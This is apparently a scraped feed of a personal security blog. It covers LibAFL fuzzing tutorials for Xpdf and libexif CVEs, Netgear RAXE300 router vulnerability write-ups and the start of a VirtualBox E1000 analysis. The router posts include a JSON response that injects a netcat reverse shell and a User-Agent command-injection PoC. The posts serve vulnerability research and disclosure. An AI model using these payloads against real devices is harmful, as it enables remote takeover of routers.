n√≥i th√¨ n√≥ ƒë∆°n gi·∫£n ch·ªâ nh·∫≠n input v√†o v√† mutate n√≥. V√† ƒë·ªÉ ch·ªçn cho mutational stage th√¨ m√¨nh s·ª≠ d·ª•ng Havoc Mutation.\nlet mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); main.rs\nuse core::time::Duration; use std::path::PathBuf; use libafl::{ corpus::{Corpus, InMemoryCorpus, OnDiskCorpus}, events::SimpleEventManager, executors::{ForkserverExecutor, TimeoutForkserverExecutor}, feedback_and_fast, feedback_or, Error, Fuzzer, StdFuzzer, feedbacks::{MaxMapFeedback, TimeFeedback, TimeoutFeedback}, inputs::BytesInput, monitors::SimpleMonitor, mutators::{havoc_mutations, StdScheduledMutator}, observers::{HitcountsMapObserver, StdMapObserver, TimeObserver}, schedulers::{IndexesLenTimeMinimizerScheduler, QueueScheduler}, stages::mutational::StdMutationalStage, state::{HasCorpus, StdState}, }; use libafl::bolts::{ current_nanos, rands::StdRand, shmem::{ShMem, ShMemProvider, StdShMemProvider}, tuples::{tuple_list, MatchName, Merge}, AsMutSlice, Truncate, }; const MAP_SIZE: usize = 65536; fn main() -\u0026gt; Result\u0026lt;(), Error\u0026gt; { let corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; let corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); let crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;))?; let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); shmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); let shmem_buf = shmem.as_mut_slice(); let edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; let mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes // Uses `with_name` to create a different history from the `MaxMapFeedback` in `feedback` above MaxMapFeedback::new(\u0026amp;edges_observer) ); let mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); let monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); let mut mgr = SimpleEventManager::new(monitor); let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //L√≠ do c√≥ @@ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† ch·ªâ ƒë·ªãnh cho ForkserverExecutor r·∫±ng ch√∫ng ta s·ª≠ d·ª•ng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(time_observer, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Ch√∫ng ta set timeout 5 gi√¢y let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); if state.corpus().count() \u0026lt; 1 { state .load_initial_inputs(\u0026amp;mut fuzzer, \u0026amp;mut executor, \u0026amp;mut mgr, \u0026amp;corpus_directory) .unwrap_or_else(|err| { panic!( \u0026#34;Failed to load initial corpus at {:?}: {:?}\u0026#34;, \u0026amp;corpus_directory, err ) }); println!(\u0026#34;We imported {} inputs from disk.\u0026#34;, state.corpus().count()); } let mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); fuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Ok(()) } Fuzz\u0026rsquo;em All # Sau khi ƒë√£ ho√†n th√†nh build c√°c component th√¨ ch√∫ng ta th·ª±c hi·ªán fuzz. Trong fuzzer th√¨ ch√∫ng ta s·∫Ω truy·ªÅn v√†o c√°c component c·∫ßn thi·∫øt nh∆∞ l√†: stages, executor, state, event manager.\nfuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Build fuzzer # B·ªüi v√¨ trong file Makefile.toml m√¨nh ƒë√£ ƒë∆∞a v√†o task cargo build n√™n n√≥ s·∫Ω t·ª± ƒë·ªông ch·∫°y fuzzing cho m√¨nh.\ncd ~/fuzzing-101/exercise-1 cargo build --release Sau khi build xong th√¨ file th·ª±c thi\nAnd the magic happen # ../target/release/exercise-one-solution Result\n[Testcase #0] run time: 0h-15m-18s, clients: 1, corpus: 1230, objectives: 1, executions: 666438, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.3 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.4 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 725.5 [Stats #0] run time: 0h-15m-21s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 723.7 [Testcase #0] run time: 0h-15m-21s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 725.4 [Stats #0] run time: 0h-15m-30s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 718.6 [Testcase #0] run time: 0h-15m-30s, clients: 1, corpus: 1234, objectives: 1, executions: 675056, exec/sec: 725.5 [Stats #0] run time: 0h-15m-34s, clients: 1, corpus: 1234, objectives: 1, executions: 677239, exec/sec: 725.0 Sample g√¢y crash ƒë∆∞·ª£c t·∫°o ra t·ª´ fuzzer ./xpdf/install/bin/pdftotext crash/067cae960270b247 Conclusion # Sau khi ch·∫°y c·ª° 15p (t√πy m√°y) th√¨ ƒë√£ c√≥ 1 file ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch c·ªßa ch√∫ng ta v·ªõi b·∫±ng ch·ª©ng l√† objectives: 1 ƒë∆∞·ª£c in ra t·ª´ component Monitor. M√¨nh nghƒ© l√† c√≥ c√°ch ƒë·ªÉ t·ªëi ∆∞u th·ªùi gian h∆°n, m√¨nh t√¨m hi·ªÉu th√¨ s·ª≠ d·ª•ng afl-clang-cto thay v√¨ afl-clang-fast v√† s·ª≠ d·ª•ng in-process executor thay v√¨ l√† forkserver.\nN·∫øu nh∆∞ b·∫°n c√≥ c√¢u h·ªèi th√¨ hay dm cho m√¨nh\nTwitter: @y198_nt Discord: y198#6338\nThank you for reading ü´∂\n","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter1/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2019-13288","title":"LibAFL Fuzzing Holy Bible - Chapter I: Fuzzing Xpdf - CVE-2019-13288"},{"content":" tags: libafl # Background # Antonio Morales ƒë√£ t·∫°o m·ªôt c√°i repo Fuzzing 101 v·ªõi m·ª•c ƒë√≠ch l√† t·∫°o ra c√°c challenge li√™n quan ƒë·∫øn nh·ªØng ki·∫øn th·ª©c v√† basic skill c·ªßa fuzzing d√†nh cho nh·ªØng ai mu·ªën h·ªçc n√≥ v√† s·ª≠ d·ª•ng n√≥ ƒë·ªÉ t√¨m ra c√°c vulnerabilities. Repo n√†y t·∫≠p trung v√†o c√°ch s·ª≠ d·ª•ng c·ªßa AFL++ nh∆∞ng trong series m√¨nh vi·∫øt v·ªõi m·ª•c ƒë√≠ch l√† solve nh·ªØng challenge s·ª≠ d·ª•ng LibAFL thay v√¨ l√† AFL++.\nTrong series n√†y th√¨ m√¨nh s·∫Ω t√¨m hi·ªÉu c√°c th∆∞ vi·ªán v√† vi·∫øt fuzzers b·∫±ng ng√¥n ng·ªØ Rust, m√¨nh s·∫Ω c·ªë g·∫Øng solve c√°c challenges g·∫ßn gi·ªëng v·ªõi solution nh·∫•t m√† m√¨nh c√≥ th·ªÉ l√†m ƒë∆∞·ª£c.\nV√† trong series n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng ng√¥n ng·ªØ Rust ƒë·ªÉ vi·∫øt fuzzers. N·∫øu nh∆∞ b·∫°n ch∆∞a bi·∫øt Rust v√† Fuzzers l√† g√¨ th√¨ m√¨nh khuy·∫øn kh√≠ch b·∫°n n√™n t√¨m hi·ªÉu v·ªÅ n√≥ tr∆∞·ªõc khi ƒë·ªçc nh·ªØng g√¨ ti·∫øp theo.\nAbout LibAFL # LibAFL l√† m·ªôt s·ª± c·∫£i ti·∫øn t·ª´ AFL++ ƒë∆∞·ª£c vi·∫øt b·∫±ng ng√¥n ng·ªØ Rust. N√≥ nhanh h∆°n, ƒëa d·∫°ng n·ªÅn t·∫£ng, no_std compatibles v√† n√≥ t·∫≠n d·ª•ng t·ªët ngu·ªìn t√†i nguy√™n c·ªßa m√°y.\nƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ LibAFL b·∫°n c√≥ th·ªÉ coi c√°i n√†y Fuzzers Like Lego @rC3\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install N·∫øu nh∆∞ b·∫°n g·∫∑p l·ªói v·ªõi unicornafl th√¨ h√£y th·ª≠ downgrade version c·ªßa python xu·ªëng 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Objective # ·ªû chapter l·∫ßn n√†y t∆∞∆°ng ·ª©ng v·ªõi exercise-2 trong Fuzzing 101. M·ª•c ƒë√≠ch c·ªßa exercise n√†y ƒë√≥ l√† ch√∫ng ta c·∫ßn ph·∫£i t√¨m m·ªôt c√°i PoC/crash cho CVE-2009-3895 \u0026amp; CVE-2012-2836.\nCVE-2009\nHeap-based buffer overflow in the exif_entry_fix function (aka the tag fixup routine) in libexif/exif-entry.c in libexif 0.6.18 allows remote attackers to cause a denial of service or possibly execute arbitrary code via an invalid EXIF image. NOTE: some of these details are obtained from third party information.\nCVE-2012-2836\nThe exif_data_load_data function in exif-data.c in the EXIF Tag Parsing Library (aka libexif) before 0.6.21 allows remote attackers to cause a denial of service (out-of-bounds read) or possibly obtain sensitive information from process memory via crafted EXIF tags in an image.\nBefore Fuzzing # Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu fuzzing ch√∫ng ta c·∫ßn ph·∫£i chu·∫©n b·ªã m·ªôt s·ªë th·ª©\nSetup our target # gh0st@fuzzing-bible:~/fuzzing-101-solutions$ cargo new --lib exercise-2 Ch√∫ng ta update member cho file Cargo.toml g·ªëc\nfuzzing-101-solutions/Cargo.toml\n[workspace] members = [ \u0026#34;exercise-1\u0026#34;, \u0026#34;exercise-2\u0026#34;, ] Install libexif # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ tar -xvf libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ rm libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mv libexif-libexif-0_6_14-release libexif Install requirements\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ sudo apt-get install autopoint libtool gettext libpopt-dev Build our target # L·∫ßn n√†y m√¨nh ti·∫øp t·ª•c s·ª≠ d·ª•ng Makefile.toml v√¨ s·ª± ti·ªán l·ª£i c·ªßa n√≥ trong vi·ªác build nh·ªØng task m√¨nh c·∫ßn cho fuzzing\nN·∫øu b·∫°n ch∆∞a bi·∫øt Makefile.toml l√† g√¨ th√¨ m√¨nh suggest b·∫°n xem blog tr∆∞·ªõc c·ªßa m√¨nh, m√¨nh n√≥i kh√° k·ªπ v·ªÅ tool n√†y https://hackmd.io/jW6RBTbjTfqjGxRvR-DiLQ#Makefiletoml\n[tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;libexif-clean\u0026#34;, \u0026#34;build-clean\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.libexif-clean] command = \u0026#34;make\u0026#34; args = [\u0026#34;-C\u0026#34;, \u0026#34;libexif\u0026#34;, \u0026#34;clean\u0026#34;, \u0026#34;-i\u0026#34;] [tasks.build-clean] command = \u0026#34;rm\u0026#34; args = [\u0026#34;-rf\u0026#34;, \u0026#34;build/\u0026#34;] [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-libexif\u0026#34;] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;] [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; Run the build\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ cargo make build Confirm build th√†nh c√¥ng\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ ls build/lib/libexif.a build/lib/libexif.a Get into fuzzing # Setting up fuzzer # ~/fuzzing-101-solutions/exercise-2/Cargo.toml\n[dependencies] libafl = {version = \u0026#34;0.10.1\u0026#34;} libafl_cc = {version = \u0026#34;0.10.1\u0026#34;} libafl_targets = {version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ]} clap = \u0026#34;3.0.0-beta.5\u0026#34; [lib] name=\u0026#34;exercisetwo\u0026#34; crate-type=[\u0026#34;staticlib] Get some corpus # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mkdir corpus solutions ·ªû trong libexif repo h·ªç ƒë·ªÉ s·∫µn m·ªôt s·ªë file jpg ƒë·ªÉ l√†m test data, ƒë·ªÉ thu·∫≠n ti·ªán th√¨ ch√∫ng ta s·∫Ω l·∫•y c√°c file jpg ƒë√≥ v·ªÅ l√†m test case cho fuzzer.\nfuzzing-101-solutions/exercise-2/corpus\ngit clone --no-checkout --filter=blob:none https://github.com/libexif/libexif.git fuzzing-101-solutions/exercise-2/corpus\ncd libexif git checkout master -- test/testdata fuzzing-101-solutions/exercise-2/corpus/libexif\nmv test/testdata/*.jpg ../ cd .. rm -rf libexif V√† ƒë√¢y l√† nh·ªØng file ƒë·ªÉ l√†m test case cho fuzzer\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus$ ls -la total 72 drwxrwxr-x 2 gh0st gh0st 4096 Thg 12 29 14:55 . drwxrwxr-x 7 gh0st gh0st 4096 Thg 12 29 14:55 .. -rw-rw-r-- 1 gh0st gh0st 2026 Thg 12 29 14:54 canon_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 3978 Thg 12 29 14:54 fuji_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 2850 Thg 12 29 14:54 olympus_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 6140 Thg 12 29 14:54 olympus_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 11458 Thg 12 29 14:54 olympus_makernote_variant_4.jpg -rw-rw-r-- 1 gh0st gh0st 9604 Thg 12 29 14:54 olympus_makernote_variant_5.jpg -rw-rw-r-- 1 gh0st gh0st 1346 Thg 12 29 14:54 pentax_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 1918 Thg 12 29 14:54 pentax_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 9132 Thg 12 29 14:54 pentax_makernote_variant_4.jpg ","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter2/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2009-3895 \u0026amp; CVE-2012-2836","title":"LibAFL Fuzzing Holy Bible - Chapter II: Fuzzing Libexif - CVE-2009-3895 \u0026 CVE-2012-2836"},{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/","section":"y198","summary":"","title":"y198"},{"content":"","date":"25 April 2023","externalUrl":null,"permalink":"/tags/netgear/","section":"Tags","summary":"","title":"Netgear"},{"content":" background # Nighthawk RAXE300 router has a binary file call pucfu, lies in /bin/pucfu. This file main function is checking the firmware update. This file is executed while the router is booted and it will attempt to connect https://devcom.up.netgear.com/, and sending a https request to it.\nanalyze and root cause of vulnerability # It sending a request to https://devcom.up.netgear.com/ by curl_post (usr/lib/libfwcheck.so) function, and it is quite interested in this below snippet.\nsize_t __fastcall curl_post(const char *url, const char *post_data, void **a3) { /// fw_debug(1, \u0026#34; URL is %s\\n\u0026#34;, url); curl_easy_setopt(curl, 10002, url); curl_easy_setopt(curl, 10023, http_content_header); curl_easy_setopt(curl, 10015, post_data); curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1 curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2 curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, 1); data_size = strlen(post_data); curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, data_size); curl_easy_setopt(curl, 20011, sub_68CC); curl_easy_setopt(curl, 10001, s); } The first vulnerable lies in the line of comment [1] and [2].\ncurl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1, this function setting CURLOPT_SSL_VERIFYHOST to 0, which mean, it\u0026rsquo;s disable hostname verification and cURL will not verify the server\u0026rsquo;s hostname. curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2, similar to the above function, this line of code, it\u0026rsquo;s disable the verification of SSL/TLS certificate, which mean it won\u0026rsquo;t check the validity of the server\u0026rsquo;s SSL/TLS certification.\nCombine the two line of flaw code above, hacker can abuse it to perform man-in-the-middle attack, which mean they can fake the DHCP or DNS update server.\nNormal respone from the server:\n{ \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;https://test\u0026#34; } The second vulnerability lies in pufwUpgrade, this file is executed at the same time with pucfu file, it\u0026rsquo;s check the firmware upgrade and the url to check for upgrade is from /tmp/fw/cfu_url_cache (which store before in pucfu file). After it reads the url for update, the FwGetUpdate function at address 0x000126F8 in pufwUpgrade binary file, the FwGetUpdate function push the url to the DownloadFiles function as the first argument.\nint FwGetUpdate(int a1) { // while ( 1 ) { SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_sku\u0026#34;, v69); SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_url\u0026#34;, \u0026amp;byte_2717C); v4 = DownloadFiles(firmware_url_update, \u0026#34;/tmp/fw/dl_fileinfo_unicode\u0026#34;, \u0026#34;/tmp/fw/dl_result\u0026#34;, 0); /// } } In the DownloadFiles (at address 0x00002DE0 in file libpu_util.so) function, the url is stored as a string for the command line.\nint DownloadFiles(const char *url_update, const char *a2, char *filename, int a4) { if (is_http) { // }else { snprintf( s, 0x1F4u, \u0026#34;(curl --fail --insecure %s --max-time %d --speed-time 15 --speed-limit 1000 -o %s 2\u0026gt; %s; echo $? \u0026gt; %s)\u0026#34;, url_update, v7, a2, \u0026#34;/tmp/curl_result_err.txt\u0026#34;, \u0026#34;/tmp/curl_result.txt\u0026#34;); j_DBG_PRINT(\u0026#34;%s:%d, cmd=%s\\n\u0026#34;, \u0026#34;DownloadFiles\u0026#34;, 328, s); v15 = j_pegaPopen((int)s, (int)\u0026#34;r\u0026#34;); // } } The command line (which has url inside) is push into j_pegaPopen function as the first argument, after that in pegaPopen function (at address 0x00001D74 in libpu_util.so file), it\u0026rsquo;s execute the command line as the first argument with /bin/sh.\nCombine the two bug above, attacker can fake the https update server and do command injection in the url easily.\nCommand Injection In Respone Data # { \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;\u0026#39;; rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f #\u0026#34; } The above snippet injects the reverse shell command rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f ( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) into the url parameter, which mean it will sending a root shell to IP 192.168.0.1 port 31337.\n","date":"25 April 2023","externalUrl":null,"permalink":"/posts/wan_bug_raxe300/","section":"Posts","summary":"Second bug I found in RAXE300 Netgear device. A WAN bug lead to RCE","title":"WAN bug in RAXE300"},{"content":" background # After studied about security and played CTF for a year, I decide to move on to the real world playground, and I choose Nighthawk RAXE300 as a target. Below is how I found the command injection bug in Nighthawk RAXE300.\nAfter studying of hacking router devices, I realized that common LAN bug come from many of services such as: hostapd, httpd, smb,\u0026hellip; So when started to analyze the RAXE300 firmware, I\u0026rsquo;m try to reverse some files like: pudil, pucfu, dhcpc, puhttpsniff, they took me a lot of time and efford for reversing. When I stop at puhttpsniff, It\u0026rsquo;s quite an interested file and code base of it quite small, so I decide to dig deep into puhttpsniff.\nLAN bug in RAXE300 firmware # I discovered one of the many vulnerabilities of RAXE300 was the command injection in \u0026ndash;user-agent field of the device. The bug lie in the function at address 0x10EC0 of puhttpsniff binary file, you can see in the below snippet:\nchar *__fastcall sub_10EC0(const char *a1, int a2, _WORD *a3, int a4) { ... result = strstr(a1, \u0026#34;User-Agent: \u0026#34;); if ( result ) { _isoc99_sscanf(result + 12, \u0026#34;%255[^\\r\\n]\u0026#34;, v17); .... sprintf((char *)v18, \u0026#34;pudil -i %s \\\u0026#34;%s\\\u0026#34;\u0026#34;, v12, (const char *)v17); result = (char *)system((const char *)v18); ... } ... } In summary, the above function, it takes contents from User-Agent field and pass it into the second argument of pudil command and run it with system command.\nAs you can see the above code. First it find does User-Agent exist in a1 variable by result = strstr(a1, \u0026quot;User-Agent: \u0026quot;); , after that it reads input with _isoc99_sscanf(result + 12, \u0026quot;%255[^\\r\\n]\u0026quot;, v17); and store it in v17 variable. Next it pass v17 as the second argument into pudil command and store the string in v18 variable, sprintf((char *)v18, \u0026quot;pudil -i %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, v12, (const char *)v17);. After that it run the command by system function with v18 is the first argument.\nBecause it doesn\u0026rsquo;t check some special character, so we can easy to exploit the command injection bug with ` character.\nPoC: curl --user-agent \u0026quot;a`ls`\u0026quot; 192.168.0.1\n","date":"21 April 2023","externalUrl":null,"permalink":"/posts/my_very_first_bug/","section":"Posts","summary":"My first bug I found in Real World stuff. A LAN bug in RAXE300 Netgear device","title":"My very first bug"},{"content":"","date":"28 November 2022","externalUrl":null,"permalink":"/tags/virtualbox/","section":"Tags","summary":"","title":"Virtualbox"},{"content":" m·∫£ng Tx(transmit) descriptor s·∫Ω tr√¥ng nh∆∞ th·∫ø n√†y [context_1, data_2, data_3, context_4, data_5]\ncontext_1.header_length = 0 context_1.maximum_segment_size = 0x3010 context_1.tcp_segmentation_enabled = true data_2.data_length = 0x10 data_2.end_of_packet = false data_2.tcp_segmentation_enabled = true data_3.data_length = 0 data_3.end_of_packet = true data_3.tcp_segmentation_enabled = true context_4.header_length = 0 context_4.maximum_segment_size = 0xF context_4.tcp_segmentation_enabled = true data_5.data_length = 0x4188 data_5.end_of_packet = true data_5.tcp_segmentation_enabled = true Ph√¢n t√≠ch nguy√™n nh√¢n c·ªët l·ªói g√¢y ra bug # C√°c h√†m quan tr·ªçng c·∫ßn ph·∫£i n·∫Øm\ne1kXmitPending() (src/VBox/Devices/Network/DevE1000.cpp) static int e1kXmitPending(PE1KSTATE pThis, bool fOnWorkerThread) { ... while (!pThis-\u0026gt;fLocked \u0026amp;\u0026amp; e1kTxDLazyLoad(pThis)) { while (e1kLocateTxPacket(pThis)) { fIncomplete = false; /* Found a complete packet, allocate it. */ rc = e1kXmitAllocBuf(pThis, pThis-\u0026gt;fGSO); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; /* Copy the packet to allocated buffer and send it. */ rc = e1kXmitPacket(pThis, fOnWorkerThread); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; } } ... } DECLINLINE(bool) e1kTxDLazyLoad(PE1KSTATE 